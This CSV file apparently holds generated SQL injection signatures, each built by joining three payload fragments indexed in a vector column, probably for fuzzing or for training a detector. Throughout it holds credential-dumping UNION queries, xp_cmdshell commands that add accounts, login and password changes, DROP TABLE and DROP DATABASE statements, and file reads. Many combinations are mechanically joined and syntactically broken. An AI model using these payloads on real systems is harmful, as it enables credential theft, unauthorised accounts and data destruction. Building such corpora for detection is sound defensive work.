sig_vector,sig_string
"[37, 36, 23]"," WAITFOR DELAY '0:0:5' (select @@version） union select 1,username,password from users where id=2"
"[58, 36, 27]", (select count(*) from sysobjects) (select @@version） select * from users where id=1
"[5, 36, 51]",") and  (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[5, 7, 78]",") and and 0 >< = 1 union select 1,2,3  /*"
"[11, 82, 1]", ) or  drop table sc3；') or
"[11, 32, 82]"," ) or  union select 1,2,(database())  drop table sc3；"
"[19, 51, 35]"," or'1'='1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 delete table dirs "
"[19, 54, 81]"," or'1'='1union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 create table test like users;"
"[2, 32, 3]","‘ union select 1,2,(database()) '')) or"
"[11, 36, 66]", ) or  (select @@version）;--
"[62, 51, 33]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exec master..xp_cmdshell '"
"[47, 78, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /* select * from users where id=1 "
"[6, 78, 3]"," 1)) or  = 1 union select 1,2,3  /*'')) or"
"[19, 36, 20]", or'1'='1 (select @@version） exists (select * from sysobjects)
"[57, 32, 14]","union select 1,@@datadir,3 union select 1,2,(database())  or "
"[67, 3, 81]",';--'')) or create table test like users;
"[19, 51, 50]"," or'1'='1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1 = 2 union all select user() "
"[9, 36, 74]", 1 or  (select @@version） ;drop table test;
"[32, 78, 21]"," union select 1,2,(database())  = 1 union select 1,2,3  /* select * from users where id=1 "
"[5, 51, 51]",") and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[62, 78, 33]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 1 union select 1,2,3  /* exec master..xp_cmdshell '"
"[47, 51, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 36, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） select * from users where id=1 "
"[19, 78, 81]"," or'1'='1 = 1 union select 1,2,3  /* create table test like users;"
"[9, 11, 78]"," 1 or  ) or  = 1 union select 1,2,3  /*"
"[82, 27, 49]"," drop table sc3； select * from users where id=1 union select 1,2,load_file('C://1.txt')"
"[45, 51, 21]","extractvalue(1, concat(0x7e,@@version,0x7e))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[31, 51, 21]"," benchmark(3000000,MD5(1))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[82, 62, 25]"," drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[82, 47, 2]"," drop table sc3；union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ‘"
"[5, 36, 66]",) and  (select @@version）;--
"[1, 36, 60]","') or (select @@version）ord(mid(user(),1,1))=114"
"[5, 34, 78]",") and  INSERT INTO = 1 union select 1,2,3  /*"
"[54, 1, 25]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3') or updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[5, 32, 51]",") and  union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[7, 78, 3]","and 0 >< = 1 union select 1,2,3  /*'')) or"
"[36, 9, 26]"," (select @@version） 1 or  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[47, 45, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 extractvalue(1, concat(0x7e,@@version,0x7e)) select * from users where id=1 "
"[1, 36, 8]",') or (select @@version）and( 
"[32, 30, 81]"," union select 1,2,(database())  select version() create table test like users;"
"[5, 50, 51]",") and  1 = 2 union all select user() union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[1, 36, 15]",') or (select @@version） and 1=2 
"[12, 36, 78]","1 ' (select @@version） = 1 union select 1,2,3  /*"
"[35, 56, 13]"," delete table dirs union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) admin'"
"[12, 62, 26]","1 ' 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,1,1,load_file(c:\\boot.ini) 
"
"[14, 78, 56]"," or  = 1 union select 1,2,3  /*union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[78, 44, 33]"," = 1 union select 1,2,3  /*create table dirs(paths varchar(100), id int) exec master..xp_cmdshell '"
"[19, 2, 81]", or'1'='1‘ create table test like users;
"[2, 47, 51]","‘union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[62, 61, 23]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 1=(select name from master.dbo.sysdatabases where id=1) union select 1,username,password from users where id=2"
"[51, 51, 73]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3>=0 --"
"[41, 51, 51]","exec master.dbo.sp_addlogin usernameunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[27, 50, 51]"," select * from users where id=1 1 = 2 union all select user() union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[13, 36, 51]"," admin' (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[19, 26, 81]"," or'1'='1 union select 1,1,1,load_file(c:\\boot.ini) 
 create table test like users;"
"[47, 36, 50]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） 1 = 2 union all select user() "
"[5, 33, 51]",") and  exec master..xp_cmdshell 'union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[44, 36, 81]","create table dirs(paths varchar(100), id int) (select @@version） create table test like users;"
"[51, 36, 69]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select @@version）#"
"[0, 49, 51]","'' or union select 1,2,load_file('C://1.txt')union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[24, 36, 76]"," 1=(if((user() regexp '^r'),1,0)) (select @@version） ;insert into users(id,username,password) values('100','new','new');"
"[47, 18, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  && select * from users where id=1 "
"[46, 78, 51]","1 = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[5, 67, 76]",") and ';-- ;insert into users(id,username,password) values('100','new','new');"
"[47, 38, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select Count(*) from table)>0 select * from users where id=1 "
"[47, 60, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ord(mid(user(),1,1))=114 select * from users where id=1 "
"[47, 50, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1 = 2 union all select user()  select * from users where id=1 "
"[47, 78, 22]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /* union select 1,2"
"[47, 13, 27]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  admin' select * from users where id=1"
"[48, 36, 21]",(select user_name()) (select @@version） select * from users where id=1 
"[26, 51, 30]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select version()"
"[26, 51, 21]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 37, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  WAITFOR DELAY '0:0:5' select * from users where id=1 "
"[14, 51, 21]"," or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 54, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1 "
"[3, 82, 35]",'')) or drop table sc3； delete table dirs 
"[47, 51, 34]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 INSERT INTO"
"[47, 51, 63]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),31"
"[30, 51, 21]"," select version()union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 34, 2]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  INSERT INTO‘"
"[4, 36, 77]",' and  (select @@version） ;delete from user_data;
"[47, 27, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1 select * from users where id=1 "
"[34, 33, 6]", INSERT INTO exec master..xp_cmdshell ' 1)) or 
"[47, 17, 26]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ' and 1=2 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[47, 30, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select version() select * from users where id=1 "
"[47, 36, 40]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）(select IS_MEMBER('db_owner'))"
"[29, 82, 67]", drop database db drop table sc3；';--
"[22, 51, 21]"," union select 1,2union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[47, 21, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1  select * from users where id=1 "
"[47, 36, 73]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）>=0 --"
"[47, 43, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 exec master.dbo.xp_cmdshell 'net user username password /add' select * from users where id=1 "
"[47, 49, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,load_file('C://1.txt') select * from users where id=1 "
"[22, 36, 62]"," union select 1,2 (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[44, 44, 32]","create table dirs(paths varchar(100), id int)create table dirs(paths varchar(100), id int) union select 1,2,(database()) "
"[47, 51, 17]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ' and 1=2"
"[26, 36, 62]"," union select 1,1,1,load_file(c:\\boot.ini) 
 (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[42, 19, 21]","exec master.dbo.sp_password null,username,password or'1'='1 select * from users where id=1 "
"[3, 2, 21]",'')) or‘ select * from users where id=1 
"[32, 36, 78]"," union select 1,2,(database())  (select @@version） = 1 union select 1,2,3  /*"
"[16, 51, 21]"," and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[55, 51, 1]"," order by 1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[82, 36, 21]", drop table sc3； (select @@version） select * from users where id=1 
"[32, 51, 78]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[26, 36, 82]"," union select 1,1,1,load_file(c:\\boot.ini) 
 (select @@version） drop table sc3；"
"[5, 49, 47]",") and  union select 1,2,load_file('C://1.txt')union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[51, 36, 2]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select @@version）‘"
"[40, 36, 56]","(select IS_MEMBER('db_owner')) (select @@version）union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[47, 36, 17]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） ' and 1=2"
"[47, 7, 71]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 and 0 >< = 1 --"
"[47, 48, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select user_name()) select * from users where id=1 "
"[30, 36, 29]", select version() (select @@version） drop database db
"[78, 36, 21]"," = 1 union select 1,2,3  /* (select @@version） select * from users where id=1 "
"[47, 59, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select count(*) from admin where len(*)>0) select * from users where id=1 "
"[55, 36, 62]", order by 1 (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[8, 51, 23]","and( union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[78, 43, 21]"," = 1 union select 1,2,3  /*exec master.dbo.xp_cmdshell 'net user username password /add' select * from users where id=1 "
"[47, 51, 29]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop database db"
"[47, 13, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  admin' select * from users where id=1 "
"[47, 49, 8]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,load_file('C://1.txt')and( "
"[59, 51, 62]"," (select count(*) from admin where len(*)>0)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[32, 36, 52]"," union select 1,2,(database())  (select @@version） sleep(5)"
"[42, 6, 21]","exec master.dbo.sp_password null,username,password 1)) or  select * from users where id=1 "
"[47, 36, 16]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） and "
"[47, 36, 41]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）exec master.dbo.sp_addlogin username"
"[42, 36, 33]","exec master.dbo.sp_password null,username,password (select @@version） exec master..xp_cmdshell '"
"[28, 36, 51]","(select count(*) from mysql.user)>0 (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[5, 56, 51]",") and union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[47, 51, 79]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3--+"
"[13, 51, 6]"," admin'union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[47, 78, 43]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*exec master.dbo.xp_cmdshell 'net user username password /add'"
"[47, 26, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,1,1,load_file(c:\\boot.ini) 
 select * from users where id=1 "
"[4, 26, 51]","' and  union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[5, 17, 76]",") and  ' and 1=2 ;insert into users(id,username,password) values('100','new','new');"
"[47, 19, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  or'1'='1 select * from users where id=1 "
"[5, 36, 7]",) and  (select @@version）and 0 ><
"[16, 36, 78]"," and  (select @@version） = 1 union select 1,2,3  /*"
"[57, 3, 19]","union select 1,@@datadir,3'')) or or'1'='1"
"[47, 47, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=1 "
"[7, 36, 51]","and 0 >< (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[47, 31, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  benchmark(3000000,MD5(1)) select * from users where id=1 "
"[26, 3, 21]"," union select 1,1,1,load_file(c:\\boot.ini) 
'')) or select * from users where id=1 "
"[47, 23, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2 select * from users where id=1 "
"[62, 51, 21]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 select * from users where id=1 "
"[5, 68, 51]",") and  */union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[4, 36, 70]",' and  (select @@version）>0 --
"[47, 50, 23]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1 = 2 union all select user()  union select 1,username,password from users where id=2"
"[47, 35, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  delete table dirs  select * from users where id=1 "
"[47, 36, 32]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） union select 1,2,(database()) "
"[47, 36, 0]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）'' or"
"[44, 36, 50]","create table dirs(paths varchar(100), id int) (select @@version） 1 = 2 union all select user() "
"[21, 36, 51]"," select * from users where id=1  (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[78, 36, 62]"," = 1 union select 1,2,3  /* (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[36, 21, 76]"," (select @@version） select * from users where id=1  ;insert into users(id,username,password) values('100','new','new');"
"[6, 7, 54]"," 1)) or and 0 ><union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[48, 36, 75]","(select user_name()) (select @@version） ;select 1,2,3;"
"[78, 19, 11]"," = 1 union select 1,2,3  /* or'1'='1 ) or "
"[47, 68, 6]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  */ 1)) or "
"[35, 54, 21]"," delete table dirs union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1 "
"[47, 36, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） = 1 union select 1,2,3  /*"
"[47, 40, 56]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_MEMBER('db_owner'))union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[47, 36, 81]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） create table test like users;"
"[6, 7, 3]", 1)) or and 0 ><'')) or
"[47, 39, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_SRVROLEMEMBER('sysadmin')) select * from users where id=1 "
"[47, 6, 73]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or >=0 --"
"[47, 36, 37]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） WAITFOR DELAY '0:0:5'"
"[82, 51, 24]"," drop table sc3；union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(if((user() regexp '^r'),1,0))"
"[47, 29, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop database db select * from users where id=1 "
"[34, 36, 21]", INSERT INTO (select @@version） select * from users where id=1 
"[44, 36, 21]","create table dirs(paths varchar(100), id int) (select @@version） select * from users where id=1 "
"[12, 36, 80]",1 ' (select @@version） and 1=1;
"[47, 16, 36]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  and  (select @@version）"
"[47, 58, 21]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select count(*) from sysobjects) select * from users where id=1 "
"[78, 7, 1]"," = 1 union select 1,2,3  /*and 0 ><') or"
"[43, 36, 27]",exec master.dbo.xp_cmdshell 'net user username password /add' (select @@version） select * from users where id=1
"[35, 36, 78]"," delete table dirs  (select @@version） = 1 union select 1,2,3  /*"
"[47, 40, 3]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_MEMBER('db_owner'))'')) or"
"[17, 35, 56]"," ' and 1=2 delete table dirs union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[47, 44, 32]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 create table dirs(paths varchar(100), id int) union select 1,2,(database()) "
